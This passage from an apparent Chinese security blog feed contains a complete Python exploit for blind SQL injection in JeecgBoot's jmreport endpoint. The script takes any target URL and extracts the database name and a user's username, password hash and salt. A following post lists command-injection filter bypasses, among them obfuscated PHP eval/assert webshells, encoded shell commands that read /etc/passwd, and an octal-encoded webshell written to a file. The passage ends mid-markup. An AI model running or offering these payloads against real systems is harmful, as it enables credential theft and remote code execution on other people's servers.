class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> json<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_database</span>(<span class="hljs-params">url</span>):<br>    url=url+<span class="hljs-string">&quot;/jeecg-boot/jmreport/qurestSql&quot;</span><br>    headers = &#123;<br>        <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0&#x27;</span>,<br>        <span class="hljs-string">&#x27;Accept&#x27;</span>: <span class="hljs-string">&#x27;application/json, text/plain, */*&#x27;</span>,<br>        <span class="hljs-string">&#x27;Accept-Language&#x27;</span>: <span class="hljs-string">&#x27;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&#x27;</span>,<br>        <span class="hljs-string">&#x27;Referer&#x27;</span>: <span class="hljs-string">&#x27;http://localhost:8088/jeecg-boot/jmreport/list&#x27;</span>,<br>        <span class="hljs-string">&#x27;X-Access-Token&#x27;</span>: <span class="hljs-string">&#x27;null&#x27;</span>,<br>        <span class="hljs-string">&#x27;token&#x27;</span>: <span class="hljs-string">&#x27;null&#x27;</span>,<br>        <span class="hljs-string">&#x27;JmReport-Tenant-Id&#x27;</span>: <span class="hljs-string">&#x27;null&#x27;</span>,<br>        <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/json&#x27;</span>,<br>        <span class="hljs-string">&#x27;Connection&#x27;</span>: <span class="hljs-string">&#x27;close&#x27;</span>,<br>        <span class="hljs-string">&#x27;Sec-Fetch-Dest&#x27;</span>: <span class="hljs-string">&#x27;empty&#x27;</span>,<br>        <span class="hljs-string">&#x27;Sec-Fetch-Mode&#x27;</span>: <span class="hljs-string">&#x27;no-cors&#x27;</span>,<br>        <span class="hljs-string">&#x27;Sec-Fetch-Site&#x27;</span>: <span class="hljs-string">&#x27;same-origin&#x27;</span>,<br>        <span class="hljs-string">&#x27;Pragma&#x27;</span>: <span class="hljs-string">&#x27;no-cache&#x27;</span>,<br>        <span class="hljs-string">&#x27;Cache-Control&#x27;</span>: <span class="hljs-string">&#x27;no-cache&#x27;</span><br>    &#125;<br>    <span class="hljs-comment"># payload = &quot;&quot;&quot;&#123;&quot;apiSelectId&quot;:&quot;1316997232402231298&quot;,&quot;id&quot;:&quot;1&#x27;   having 106=(nullif(ascii((substring((select database()),1,1))),0)) or     &#x27;&quot;&#125;&quot;&quot;&quot;</span><br>    payload=<span class="hljs-string">&quot;&quot;&quot;&#123;&quot;apiSelectId&quot;:&quot;1316997232402231298&quot;,&quot;id&quot;:&quot;1&#x27;   having 32&lt;(nullif(ascii((substring((select database()),&#123;length&#125;,1))),0)) or     &#x27;&quot;&#125;&quot;&quot;&quot;</span><br>    length=<span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        payload=<span class="hljs-string">f&quot;&quot;&quot;&#123;&#123;&quot;apiSelectId&quot;:&quot;1316997232402231298&quot;,&quot;id&quot;:&quot;1&#x27;   having 32&lt;(nullif(ascii((substring((select database()),<span class="hljs-subst">&#123;length&#125;</span>,1))),0)) or     &#x27;&quot;&#125;&#125;&quot;&quot;&quot;</span><br>        response=requests.post(url,headers=headers,data=payload)<br>        res=json.loads(response.text)<br>        <span class="hljs-keyword">if</span> res[<span class="hljs-string">&quot;result&quot;</span>]==<span class="hljs-literal">None</span>:<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            length+=<span class="hljs-number">1</span><br>    database=<span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> place <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,length):<br>        <span class="hljs-built_in">min</span>=<span class="hljs-number">32</span><br>        <span class="hljs-built_in">max</span>=<span class="hljs-number">128</span><br>        mid=(<span class="hljs-built_in">min</span>+<span class="hljs-built_in">max</span>)//<span class="hljs-number">2</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-built_in">min</span>&lt;<span class="hljs-built_in">max</span>:<br>            payload=<span class="hljs-string">f&quot;&quot;&quot;&#123;&#123;&quot;apiSelectId&quot;:&quot;1316997232402231298&quot;,&quot;id&quot;:&quot;1&#x27;   having <span class="hljs-subst">&#123;mid&#125;</span>&lt;(nullif(ascii((substring((select database()),<span class="hljs-subst">&#123;place&#125;</span>,1))),0)) or     &#x27;&quot;&#125;&#125;&quot;&quot;&quot;</span><br>            response=requests.post(url,headers=headers,data=payload)<br>            res=json.loads(response.text)<br>            <span class="hljs-keyword">if</span> res[<span class="hljs-string">&quot;result&quot;</span>]!=<span class="hljs-literal">None</span>:<br>                <span class="hljs-built_in">min</span> = mid + <span class="hljs-number">1</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">max</span> = mid<br>            mid = (<span class="hljs-built_in">min</span> + <span class="hljs-built_in">max</span>) // <span class="hljs-number">2</span><br>        database+=<span class="hljs-built_in">chr</span>(mid)<br>    <span class="hljs-built_in">print</span>(database)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_user_password</span>(<span class="hljs-params">url</span>):<br>    url=url+<span class="hljs-string">&quot;/jeecg-boot/jmreport/qurestSql&quot;</span><br>    headers = &#123;<br>        <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0&#x27;</span>,<br>        <span class="hljs-string">&#x27;Accept&#x27;</span>: <span class="hljs-string">&#x27;application/json, text/plain, */*&#x27;</span>,<br>        <span class="hljs-string">&#x27;Accept-Language&#x27;</span>: <span class="hljs-string">&#x27;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&#x27;</span>,<br>        <span class="hljs-string">&#x27;Referer&#x27;</span>: <span class="hljs-string">&#x27;http://localhost:8088/jeecg-boot/jmreport/list&#x27;</span>,<br>        <span class="hljs-string">&#x27;X-Access-Token&#x27;</span>: <span class="hljs-string">&#x27;null&#x27;</span>,<br>        <span class="hljs-string">&#x27;token&#x27;</span>: <span class="hljs-string">&#x27;null&#x27;</span>,<br>        <span class="hljs-string">&#x27;JmReport-Tenant-Id&#x27;</span>: <span class="hljs-string">&#x27;null&#x27;</span>,<br>        <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/json&#x27;</span>,<br>        <span class="hljs-string">&#x27;Connection&#x27;</span>: <span class="hljs-string">&#x27;close&#x27;</span>,<br>        <span class="hljs-string">&#x27;Sec-Fetch-Dest&#x27;</span>: <span class="hljs-string">&#x27;empty&#x27;</span>,<br>        <span class="hljs-string">&#x27;Sec-Fetch-Mode&#x27;</span>: <span class="hljs-string">&#x27;no-cors&#x27;</span>,<br>        <span class="hljs-string">&#x27;Sec-Fetch-Site&#x27;</span>: <span class="hljs-string">&#x27;same-origin&#x27;</span>,<br>        <span class="hljs-string">&#x27;Pragma&#x27;</span>: <span class="hljs-string">&#x27;no-cache&#x27;</span>,<br>        <span class="hljs-string">&#x27;Cache-Control&#x27;</span>: <span class="hljs-string">&#x27;no-cache&#x27;</span><br>    &#125;<br>    length=<span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        payload=<span class="hljs-string">f&quot;&quot;&quot;&#123;&#123;&quot;apiSelectId&quot;:&quot;1316997232402231298&quot;,&quot;id&quot;:&quot;1&#x27;   having 32&lt;(nullif(ascii((substring((select username from sys_user limit 1,1),<span class="hljs-subst">&#123;length&#125;</span>,1))),0)) or     &#x27;&quot;&#125;&#125;&quot;&quot;&quot;</span><br>        response=requests.post(url,headers=headers,data=payload)<br>        res=json.loads(response.text)<br>        <span class="hljs-keyword">if</span> res[<span class="hljs-string">&quot;result&quot;</span>]==<span class="hljs-literal">None</span>:<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            length+=<span class="hljs-number">1</span><br>    username=<span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> place <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,length):<br>        <span class="hljs-built_in">min</span>=<span class="hljs-number">32</span><br>        <span class="hljs-built_in">max</span>=<span class="hljs-number">128</span><br>        mid=(<span class="hljs-built_in">min</span>+<span class="hljs-built_in">max</span>)//<span class="hljs-number">2</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-built_in">min</span>&lt;<span class="hljs-built_in">max</span>:<br>            payload=<span class="hljs-string">f&quot;&quot;&quot;&#123;&#123;&quot;apiSelectId&quot;:&quot;1316997232402231298&quot;,&quot;id&quot;:&quot;1&#x27;   having <span class="hljs-subst">&#123;mid&#125;</span>&lt;(nullif(ascii((substring((select username from sys_user limit 1,1),<span class="hljs-subst">&#123;place&#125;</span>,1))),0)) or     &#x27;&quot;&#125;&#125;&quot;&quot;&quot;</span><br>            response=requests.post(url,headers=headers,data=payload)<br>            res=json.loads(response.text)<br>            <span class="hljs-keyword">if</span> res[<span class="hljs-string">&quot;result&quot;</span>]!=<span class="hljs-literal">None</span>:<br>                <span class="hljs-built_in">min</span> = mid + <span class="hljs-number">1</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">max</span> = mid<br>            mid = (<span class="hljs-built_in">min</span> + <span class="hljs-built_in">max</span>) // <span class="hljs-number">2</span><br>        username+=<span class="hljs-built_in">chr</span>(mid)<br>    length=<span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        payload=<span class="hljs-string">f&quot;&quot;&quot;&#123;&#123;&quot;apiSelectId&quot;:&quot;1316997232402231298&quot;,&quot;id&quot;:&quot;1&#x27;   having 32&lt;(nullif(ascii((substring((select password from sys_user limit 1,1),<span class="hljs-subst">&#123;length&#125;</span>,1))),0)) or     &#x27;&quot;&#125;&#125;&quot;&quot;&quot;</span><br>        response=requests.post(url,headers=headers,data=payload)<br>        res=json.loads(response.text)<br>        <span class="hljs-keyword">if</span> res[<span class="hljs-string">&quot;result&quot;</span>]==<span class="hljs-literal">None</span>:<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            length+=<span class="hljs-number">1</span><br>    password=<span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> place <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,length):<br>        <span class="hljs-built_in">min</span>=<span class="hljs-number">32</span><br>        <span class="hljs-built_in">max</span>=<span class="hljs-number">128</span><br>        mid=(<span class="hljs-built_in">min</span>+<span class="hljs-built_in">max</span>)//<span class="hljs-number">2</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-built_in">min</span>&lt;<span class="hljs-built_in">max</span>:<br>            payload=<span class="hljs-string">f&quot;&quot;&quot;&#123;&#123;&quot;apiSelectId&quot;:&quot;1316997232402231298&quot;,&quot;id&quot;:&quot;1&#x27;   having <span class="hljs-subst">&#123;mid&#125;</span>&lt;(nullif(ascii((substring((select password from sys_user limit 1,1),<span class="hljs-subst">&#123;place&#125;</span>,1))),0)) or     &#x27;&quot;&#125;&#125;&quot;&quot;&quot;</span><br>            response=requests.post(url,headers=headers,data=payload)<br>            res=json.loads(response.text)<br>            <span class="hljs-keyword">if</span> res[<span class="hljs-string">&quot;result&quot;</span>]!=<span class="hljs-literal">None</span>:<br>                <span class="hljs-built_in">min</span> = mid + <span class="hljs-number">1</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">max</span> = mid<br>            mid = (<span class="hljs-built_in">min</span> + <span class="hljs-built_in">max</span>) // <span class="hljs-number">2</span><br>        password+=<span class="hljs-built_in">chr</span>(mid)<br>    length=<span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        payload=<span class="hljs-string">f&quot;&quot;&quot;&#123;&#123;&quot;apiSelectId&quot;:&quot;1316997232402231298&quot;,&quot;id&quot;:&quot;1&#x27;   having 32&lt;(nullif(ascii((substring((select salt from sys_user limit 1,1),<span class="hljs-subst">&#123;length&#125;</span>,1))),0)) or     &#x27;&quot;&#125;&#125;&quot;&quot;&quot;</span><br>        response=requests.post(url,headers=headers,data=payload)<br>        res=json.loads(response.text)<br>        <span class="hljs-keyword">if</span> res[<span class="hljs-string">&quot;result&quot;</span>]==<span class="hljs-literal">None</span>:<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            length+=<span class="hljs-number">1</span><br>    salt=<span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> place <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,length):<br>        <span class="hljs-built_in">min</span>=<span class="hljs-number">32</span><br>        <span class="hljs-built_in">max</span>=<span class="hljs-number">128</span><br>        mid=(<span class="hljs-built_in">min</span>+<span class="hljs-built_in">max</span>)//<span class="hljs-number">2</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-built_in">min</span>&lt;<span class="hljs-built_in">max</span>:<br>            payload=<span class="hljs-string">f&quot;&quot;&quot;&#123;&#123;&quot;apiSelectId&quot;:&quot;1316997232402231298&quot;,&quot;id&quot;:&quot;1&#x27;   having <span class="hljs-subst">&#123;mid&#125;</span>&lt;(nullif(ascii((substring((select salt from sys_user limit 1,1),<span class="hljs-subst">&#123;place&#125;</span>,1))),0)) or     &#x27;&quot;&#125;&#125;&quot;&quot;&quot;</span><br>            response=requests.post(url,headers=headers,data=payload)<br>            res=json.loads(response.text)<br>            <span class="hljs-keyword">if</span> res[<span class="hljs-string">&quot;result&quot;</span>]!=<span class="hljs-literal">None</span>:<br>                <span class="hljs-built_in">min</span> = mid + <span class="hljs-number">1</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">max</span> = mid<br>            mid = (<span class="hljs-built_in">min</span> + <span class="hljs-built_in">max</span>) // <span class="hljs-number">2</span><br>        salt+=<span class="hljs-built_in">chr</span>(mid)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;用户名为：&quot;</span>+username+<span class="hljs-string">&quot;\n密码为：&quot;</span>+password+<span class="hljs-string">&quot;\n盐为：&quot;</span>+salt)<br><span class="hljs-comment"># get_database(&quot;http://localhost:8088&quot;)</span><br>url=<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;please input your target: (example:http://localhost:8088)&quot;</span>)<br><span class="hljs-comment"># get_database(url)</span><br>get_user_password(url)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CVE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CVE</tag>
      
      <tag>代码审计</tag>
      
      <tag>JeecgBoot</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>命令执行绕过</title>
    <link href="/2022/07/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87/"/>
    <url>/2022/07/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87/</url>
    
    <content type="html"><![CDATA[<h1 id="命令执行无字母数字绕过"><a href="#命令执行无字母数字绕过" class="headerlink" title="命令执行无字母数字绕过"></a>命令执行无字母数字绕过</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[a-z0-9]/is&#x27;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;shell&#x27;</span>]))<br>&#123;<br>  <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;shell&#x27;</span>]);<br>&#125;<br><br><br><span class="hljs-number">1</span>.异或<br><span class="hljs-variable">$_</span>=(<span class="hljs-string">&#x27;%01&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%13&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%13&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%05&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%12&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%14&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>); <span class="hljs-comment">// $_=&#x27;assert&#x27;;</span><br><span class="hljs-variable">$__</span>=<span class="hljs-string">&#x27;_&#x27;</span>.(<span class="hljs-string">&#x27;%0D&#x27;</span>^<span class="hljs-string">&#x27;]&#x27;</span>).(<span class="hljs-string">&#x27;%2F&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%0E&#x27;</span>^<span class="hljs-string">&#x27;]&#x27;</span>).(<span class="hljs-string">&#x27;%09&#x27;</span>^<span class="hljs-string">&#x27;]&#x27;</span>); <span class="hljs-comment">//$__=&#x27;_POST&#x27;;</span><br><span class="hljs-variable">$___</span>=<span class="hljs-variable">$$__</span>;<br><span class="hljs-variable">$_</span>(<span class="hljs-variable">$___</span>[_]); <span class="hljs-comment">//assert($_POST[_]);</span><br><br><span class="hljs-number">2</span>.取反<br><span class="hljs-variable">$__</span>=(<span class="hljs-string">&#x27;&gt;&#x27;</span>&gt;<span class="hljs-string">&#x27;&lt;&#x27;</span>)+(<span class="hljs-string">&#x27;&gt;&#x27;</span>&gt;<span class="hljs-string">&#x27;&lt;&#x27;</span>);<br><span class="hljs-variable">$_</span>=<span class="hljs-variable">$__</span>/<span class="hljs-variable">$__</span>;<br><span class="hljs-variable">$____</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;瞰&quot;</span>;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$_</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;和&quot;</span>;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$__</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;和&quot;</span>;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$__</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;的&quot;</span>;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$_</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;半&quot;</span>;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$_</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;始&quot;</span>;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$__</span>&#125;);<br><span class="hljs-variable">$_____</span>=<span class="hljs-string">&#x27;_&#x27;</span>;<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;俯&quot;</span>;<span class="hljs-variable">$_____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$__</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;瞰&quot;</span>;<span class="hljs-variable">$_____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$__</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;次&quot;</span>;<span class="hljs-variable">$_____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$_</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;站&quot;</span>;<span class="hljs-variable">$_____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$_</span>&#125;);<br><span class="hljs-variable">$_</span>=<span class="hljs-variable">$$_____</span>;<br><span class="hljs-variable">$____</span>(<span class="hljs-variable">$_</span>[<span class="hljs-variable">$__</span>]); <span class="hljs-comment">//assert($_POST[2]);</span><br><br><span class="hljs-number">3</span>.php7<br>PHP7前是不允许用(<span class="hljs-variable">$a</span>)();这样的方法来执行动态函数的，但PHP7中增加了对此的支持。<br>(~%<span class="hljs-number">8</span>F%<span class="hljs-number">97</span>%<span class="hljs-number">8</span>F%<span class="hljs-number">96</span>%<span class="hljs-number">91</span>%<span class="hljs-number">99</span>%<span class="hljs-number">90</span>)(); -&gt;(<span class="hljs-string">&#x27;phpinfo&#x27;</span>)();<br><br></code></pre></td></tr></table></figure><h1 id="linux常见绕过方法"><a href="#linux常见绕过方法" class="headerlink" title="linux常见绕过方法"></a>linux常见绕过方法</h1><p>[TOC]</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">cat /etc/passwd<br><span class="hljs-number">16</span>bit <span class="hljs-keyword">format</span><br><br>&#123;\c<span class="hljs-string">&#x27;&#x27;</span>\a&quot;&quot;t,/<span class="hljs-string">e&#x27;&#x27;</span>*?/?a?s??&#125;<br><br>&#123;\c<span class="hljs-string">&#x27;&#x27;</span>\a&quot;&quot;\t,/\<span class="hljs-string">e&#x27;&#x27;</span>*?/\p*\d&#125;<br></code></pre></td></tr></table></figure><h3 id="空格过滤"><a href="#空格过滤" class="headerlink" title="空格过滤"></a>空格过滤</h3><p>&lt; 、&lt;&gt;、%20(space)、%09(tab)、$IFS$9、 ${IFS}、$IFS等</p><h3 id="一些命令分隔符"><a href="#一些命令分隔符" class="headerlink" title="一些命令分隔符"></a>一些命令分隔符</h3><blockquote><p>linux中：%0a 、%0d 、; 、&amp; 、| 、&amp;&amp;、||</p><p>windows中：%0a、&amp;、|、%1a（一个神奇的角色，作为.bat文件中的命令分隔符）</p></blockquote><h3 id="花括号的别样用法"><a href="#花括号的别样用法" class="headerlink" title="花括号的别样用法"></a>花括号的别样用法</h3><p>在Linux bash中还可以使用{OS_COMMAND,ARGUMENT}来执行系统命令 {cat,flag}</p><p>cat t{es,}t 花括号通过逗号分割构建序列并展开</p><p>cat {tes,t}{tes,t} 花括号可以表示两个序列的笛卡尔积</p><h3 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h3><blockquote><p><strong>拼接绕过</strong><br> a&#x3D;l;b&#x3D;s;</p><p>aa</p><p>ab</p><p><strong>编码绕过</strong></p><ul><li><p><strong>base64</strong>：<br> echo “Y2F0IC9mbGFn”|base64-d|bash<br> &#x3D;&#x3D;&gt;cat &#x2F;flag</p></li><li><p><strong>hex</strong>：<br> echo “636174202f666c6167” | xxd -r -p|bash<br> &#x3D;&#x3D;&gt;cat &#x2F;flag</p></li><li><p><strong>oct</strong>：<br> $(printf “\154\163”)<br> &#x3D;&#x3D;&gt;ls</p><p>$(printf “\x63\x61\x74\x20\x2f\x66\x6c\x61\x67”)<br> &#x3D;&#x3D;&gt;cat &#x2F;flag</p><p>{printf,”\x63\x61\x74\x20\x2f\x66\x6c\x61\x67”}|$0<br> &#x3D;&#x3D;&gt;cat &#x2F;flag</p><p>#可以通过这样来写webshell,内容为<br> ${printf,\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\124\133\47\143\47\135\51\73\77\76”}<br> &#x3D;&#x3D;&gt; 1.php</p></li></ul></blockquote><h3 id="单引号和双引号绕过"><a href="#单引号和双引号绕过" class="headerlink" title="单引号和双引号绕过"></a>单引号和双引号绕过</h3><p>比如：ca’’t flag 或ca””t flag或cat &#x2F;fl’’ag</p><h3 id="0-9-、-、-、-绕过"><a href="#0-9-、-、-、-绕过" class="headerlink" title="$[0-9]、$*、$!、$@绕过"></a>$[0-9]、$*、$!、$@绕过</h3><p>Linux中$[0-9]、$*、$!、$@表示参数</p><p>比如：l$1s或ca$2t</p><h3 id="反斜杠绕过"><a href="#反斜杠绕过" class="headerlink" title="反斜杠绕过"></a>反斜杠绕过</h3><p>比如：ca\t fl\ag</p><h3 id="利用通配符"><a href="#利用通配符" class="headerlink" title="利用通配符"></a>利用通配符</h3><p>cat &#x2F;te* *匹配任意长度的任意字符<br> cat &#x2F;te?t?匹配一个任意字符<br> cat &#x2F;te[a-z] t匹配[list]列表中的所有字符</p><p>cat &#x2F;t[ ^a,b,c]st匹配非列表[^list]中的所有字符</p><h3 id="linux中直接查看文件内容的命令"><a href="#linux中直接查看文件内容的命令" class="headerlink" title="linux中直接查看文件内容的命令"></a>linux中直接查看文件内容的命令</h3><p>cat、tac、more、less、head、tail、nl、sed、sort、uniq、od</p><h1 id="绕过WAF运行命令执行漏洞的方法"><a href="#绕过WAF运行命令执行漏洞的方法" class="headerlink" title="绕过WAF运行命令执行漏洞的方法"></a>绕过WAF运行命令执行漏洞的方法</h1><p><strong>0x01 Windows（不区分大小写）</strong></p><p>1.1 符号和命令的关系</p><p>如果命令执行的时候遇到拦截命令关键词的时候可以利用如下方法绕过：</p><p><code>&quot;</code>和<code>^</code>是CMD命令中最常见的转义字符，还有成对的括号并不会影响命令的执行。</p><p>这里有几个需要注意的地方：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs 1c">在命令中可以有无数个<span class="hljs-string">&quot;，但是不能有两个连续的^</span><br>在命令中如果<span class="hljs-string">&quot;在^之前，则&quot;</span>的个数必须为偶数个<br>在命令中如果<span class="hljs-string">&quot;在^之后，并且带有参数，则命令中的&quot;</span>个数必须为偶数<br>在命令的参数中，单个字符前后<span class="hljs-string">&quot;的个数只能有一个或者两个</span><br>如果成对的括号中间有<span class="hljs-string">&quot;则&quot;</span>的个数也必须为偶数<br></code></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code 